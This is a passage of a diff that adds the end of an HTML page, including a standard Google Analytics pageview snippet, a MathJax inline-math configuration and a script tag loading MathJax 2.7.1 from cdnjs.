+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-61797645-2', 'auto');
+  ga('send', 'pageview');
+
+</script>
+
+
+
+<script type="text/x-mathjax-config">
+MathJax.Hub.Config({
+    tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    }
+});
+
+MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';                 
+    }       
+});
+</script>
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+
+  </div>
+</body>
+</html>
